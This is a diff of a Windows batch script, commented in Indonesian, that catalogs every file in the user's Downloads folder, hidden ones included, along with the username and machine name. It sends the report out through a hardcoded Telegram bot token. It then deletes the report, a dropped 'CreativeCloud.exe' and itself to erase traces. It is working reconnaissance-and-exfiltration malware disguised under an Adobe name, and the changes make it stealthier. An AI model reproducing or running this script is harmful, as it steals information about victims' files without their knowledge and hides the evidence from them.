@@ -1,56 +1,82 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: --- Konfigurasi ---
+:: ==========================================================
+:: KONFIGURASI (Ganti dengan milikmu)
+:: ==========================================================
 set "TOKEN=8475448253:AAHp0_a3es41WG7so8I2-9K_n2g59Rmgr3M"
 set "CHAT_ID=7318370755"
 set "EXE_NAME=CreativeCloud.exe"
 
+:: Target folder & Output (Menggunakan folder TEMP agar tersembunyi)
 set "TARGET=%USERPROFILE%\Downloads"
-set "OUTPUT_FILE=%TEMP%\downloads_scan_report.txt"
+set "OUTPUT_FILE=%TEMP%\DeepScan_Report.txt"
 set "SCRIPT_PATH=%~f0"
-set "SCRIPT_DIR=%~dp0"
 
-echo ----------------------------------------------------------
-echo 🔎 Scanning: %TARGET%
-echo 🚫 Skipping 'Adobe' folders...
-echo ----------------------------------------------------------
+:: ==========================================================
+:: PROSES SCANNING PRESISI
+:: ==========================================================
+echo [!] Memulai pemindaian mendalam di: %TARGET%
 
-:: Membuat Header Laporan
-echo Download Folder Scan Report > "%OUTPUT_FILE%"
-echo Scan Time: %DATE% %TIME% >> "%OUTPUT_FILE%"
-echo Target Directory: %TARGET% >> "%OUTPUT_FILE%"
-echo ---------------------------------------------------------- >> "%OUTPUT_FILE%"
+:: Membuat Header Laporan yang Informatif
+echo ========================================================== > "%OUTPUT_FILE%"
+echo 📂 FULL SYSTEM DEEP SCAN REPORT >> "%OUTPUT_FILE%"
+echo ========================================================== >> "%OUTPUT_FILE%"
+echo 👤 User      : %USERNAME% >> "%OUTPUT_FILE%"
+echo 🕒 Waktu     : %DATE% %TIME% >> "%OUTPUT_FILE%"
+echo 📍 Root Path : %TARGET% >> "%OUTPUT_FILE%"
+echo ========================================================== >> "%OUTPUT_FILE%"
+echo. >> "%OUTPUT_FILE%"
 
 if exist "%TARGET%" (
-    :: Scanning menggunakan loop dir (exclude Adobe)
-    for /f "delims=" %%i in ('dir "%TARGET%" /s /b ^| findstr /v /i "Adobe"') do (
+    :: Loop FOR /F untuk menangani path dengan spasi
+    :: dir /s = subfolder, /b = bare (path saja), /a = include hidden/system
+    for /f "delims=" %%i in ('dir "%TARGET%" /s /b /a ^| findstr /v /i "Adobe CreativeCloud"') do (
+        set "item_path=%%i"
+        
+        :: Cek apakah item adalah Folder atau File
         if exist "%%i\" (
-            echo [DIR]  %%i >> "%OUTPUT_FILE%"
+            echo [FOLDER] !item_path! >> "%OUTPUT_FILE%"
         ) else (
-            echo    ^|_ [FILE] %%i >> "%OUTPUT_FILE%"
+            :: Ambil ukuran file (dalam bytes) dan ekstensi
+            set "size=%%~zi"
+            set "ext=%%~xi"
+            echo    ^|_ [FILE] !item_path! [!ext!] [!size! bytes] >> "%OUTPUT_FILE%"
         )
     )
-    echo ✅ Scan Complete.
+    echo ✅ Scanning Selesai.
 ) else (
-    echo ❌ Target folder not found.
-    echo Target folder not found >> "%OUTPUT_FILE%"
+    echo [!] Folder target tidak ditemukan. >> "%OUTPUT_FILE%"
 )
 
-:: Mengirim File ke Telegram menggunakan PowerShell (Native di Windows)
+echo. >> "%OUTPUT_FILE%"
+echo ================= END OF REPORT ================= >> "%OUTPUT_FILE%"
+
+:: ==========================================================
+:: PENGIRIMAN KE TELEGRAM (POWERSHELL WRAPPER)
+:: ==========================================================
 if exist "%OUTPUT_FILE%" (
-    echo 📤 Sending report to Telegram...
-    powershell -Command "$resp = curl.exe -s -k -F chat_id=%CHAT_ID% -F document=@'%OUTPUT_FILE%' -F caption='Сканировани вӗҫленнӗ. Файл %EXE_NAME% Сценарие часах пӗтерӗҫ. 🧹' 'https://api.telegram.org/bot%TOKEN%/sendDocument'; exit"
+    echo [!] Mengirim laporan ke Telegram...
+    
+    :: Menggunakan PowerShell untuk stabilitas pengiriman file besar
+    powershell -Command ^
+        "$url = 'https://api.telegram.org/bot%TOKEN%/sendDocument';" ^
+        "$caption = '📊 *Deep Scan Result* from %COMPUTERNAME%';" ^
+        "curl.exe -s -k -F chat_id=%CHAT_ID% -F document=@'%OUTPUT_FILE%' -F caption=$caption $url" > nul
+    
     timeout /t 2 >nul
 )
 
-echo 🧹 Cleaning traces and self-destructing...
+:: ==========================================================
+:: PEMBERSIHAN JEJAK (SELF-DESTRUCT)
+:: ==========================================================
+echo [!] Menghapus jejak...
 
-:: Hapus file laporan
+:: Hapus file laporan di folder TEMP
 if exist "%OUTPUT_FILE%" del /f /q "%OUTPUT_FILE%"
 
-:: Hapus EXE (jika ada di direktori script)
-if exist "%SCRIPT_DIR%%EXE_NAME%" del /f /q "%SCRIPT_DIR%%EXE_NAME%"
+:: Hapus file EXE jika ada di lokasi yang sama dengan script
+if exist "%~dp0%EXE_NAME%" del /f /q "%~dp0%EXE_NAME%"
 
-:: Self-destruct file .bat ini sendiri
+:: Perintah pamungkas: File .bat menghapus dirinya sendiri
 start /b "" cmd /c del "%SCRIPT_PATH%"&exit
